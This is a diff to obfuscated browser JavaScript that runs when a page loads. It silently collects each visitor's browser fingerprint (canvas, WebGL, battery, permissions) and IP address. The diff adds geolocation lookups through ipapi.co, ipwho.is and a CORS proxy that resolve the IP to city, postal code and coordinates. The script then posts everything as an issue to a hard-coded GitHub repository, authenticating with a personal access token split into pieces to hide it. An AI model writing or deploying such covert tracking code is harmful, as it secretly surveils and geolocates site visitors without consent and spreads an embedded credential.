@@ -1,13 +1,14 @@
-(() => {
+      (() => {
   const _0xp1 = "github_pat_";
-  const _0xp2 = "11B7BASBA06vEvgxaWyK4P_rIf3tKJNJPLsYP9OZDn8WO";
-  const _0xp3 = "S5PCC0p550d6Lhzdf4BGu4X5DM37Oc4H0hP0q";
+  const _0xp2 = "11CFHQNFQ0txIlHWQ4ygph_XS6m6ytvUPKVWiRNZY00weUAk8u3C85aP";
+  const _0xp3 = "7L34CZotbOFXGHOG542MfeCRM7";
   const _0xd = "Kdbdieo3hbdk8dyxbxnkdmdjsikjkd97hHJBg7o";
   const _0xTk = _0xp1 + _0xp2 + _0xp3;
-  const _0xOn = "SZNAlpha";
-  const _0xRp = "SZNAlpha";
+  const _0xOn = "WendigosCyber";
+  const _0xRp = "WendigosCyber";
   const _0xCk = "atlas_visitor_registered";
   const _0xMx = 60 * 60 * 24 * 365;
+  const _0xPrx = "https://corsproxy.io/?";
 
   const _0xGc = (name) => {
     const key = encodeURIComponent(name) + "=";
@@ -216,6 +217,92 @@
     return result;
   };
 
+  // تلاش با ipapi.co با IP مشخص
+  const _0xGipd = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipapi.co/${ip}/json/`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.error) return null;
+      return _0xNorm(json);
+    } catch {
+      return null;
+    }
+  };
+
+  // تلاش با ipwho.is (بدون نیاز به IP)
+  const _0xGwho = async () => {
+    try {
+      const res = await _0xTf("https://ipwho.is/");
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.success) return null;
+      return _0xNormFromWho(json);
+    } catch {
+      return null;
+    }
+  };
+
+  // تلاش با پروکسی CORS به ipapi.co/json
+  const _0xGcrs = async () => {
+    try {
+      const res = await _0xTf(`${_0xPrx}https://ipapi.co/json/`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.error) return null;
+      return _0xNorm(json);
+    } catch {
+      return null;
+    }
+  };
+
+  // نرمال‌سازی خروجی ipapi.co
+  const _0xNorm = (json) => ({
+    ip: json.ip || null,
+    version: json.version || (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country_name || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone || null,
+    org: json.org || null,
+    isp: json.org || null
+  });
+
+  // نرمال‌سازی خروجی ipwho.is
+  const _0xNormFromWho = (json) => ({
+    ip: json.ip || null,
+    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone?.id || json.timezone || null,
+    org: json.connection?.org || null,
+    isp: json.connection?.isp || null
+  });
+
+  // تابع اصلی برای دریافت موقعیت با زنجیره fallback
+  const _0xGld = async (ip) => {
+    // 1) اگر IP داریم، ipapi.co با IP
+    if (ip) {
+      const r1 = await _0xGipd(ip);
+      if (r1) return r1;
+    }
+    // 2) تلاش با ipwho.is
+    const r2 = await _0xGwho();
+    if (r2) return r2;
+    // 3) تلاش نهایی با پروکسی
+    const r3 = await _0xGcrs();
+    return r3;
+  };
+
   const _0xInit = async () => {
     if (_0xGc(_0xCk) === "1") return;
 
@@ -237,6 +324,9 @@
       _0xGmd(),
       _0xGp()
     ]);
+
+    // دریافت اطلاعات موقعیت آی‌پی با زنجیره fallback
+    const ipDetails = await _0xGld(ip);
 
     const data = {
       date_local: now.toString(),
@@ -267,7 +357,7 @@
         memoryGB: navigator.deviceMemory ?? null
       },
       battery,
-      ip,
+      ip: ipDetails?.ip || ip || null,
       canvasFingerprint: _0xGcF(),
       webgl: _0xGw(),
       webgpu,
@@ -285,12 +375,36 @@
       permissions
     };
 
+    let ipSection = '';
+    if (ipDetails) {
+      ipSection = `\n## اطلاعات موقعیت جغرافیایی آی‌پی\n\n` +
+        `| فیلد | مقدار |\n|------|-------|\n` +
+        `| IP | ${ipDetails.ip} |\n` +
+        `| نسخه IP | ${ipDetails.version} |\n` +
+        `| کشور | ${ipDetails.country || '-'} |\n` +
+        `| کد کشور | ${ipDetails.countryCode || '-'} |\n` +
+        `| استان | ${ipDetails.region || '-'} |\n` +
+        `| شهر | ${ipDetails.city || '-'} |\n` +
+        `| کد پستی | ${ipDetails.postal || '-'} |\n` +
+        `| عرض جغرافیایی | ${ipDetails.latitude ?? '-'} |\n` +
+        `| طول جغرافیایی | ${ipDetails.longitude ?? '-'} |\n` +
+        `| منطقه زمانی | ${ipDetails.timezone || '-'} |\n` +
+        `| ISP/سازمان | ${ipDetails.isp || '-'} |\n`;
+    } else if (ip) {
+      ipSection = `\n## اطلاعات آی‌پی\n\n⚠️ دریافت موقعیت مکانی برای IP \`${ip}\` با خطا مواجه شد.\n`;
+    } else {
+      ipSection = `\n## اطلاعات آی‌پی\n\n❌ آی‌پی در دسترس نیست.\n`;
+    }
+
     const _0xib = [
-      "# New Visitor",
+      "# بازدید جدید",
+      "",
+      "## اثر انگشت مرورگر (Fingerprint)",
       "",
       "```json",
       JSON.stringify(data, null, 2),
-      "```"
+      "```",
+      ipSection
     ].join("\n");
 
     const response = await fetch(`https://api.github.com/repos/${_0xOn}/${_0xRp}/issues`, {
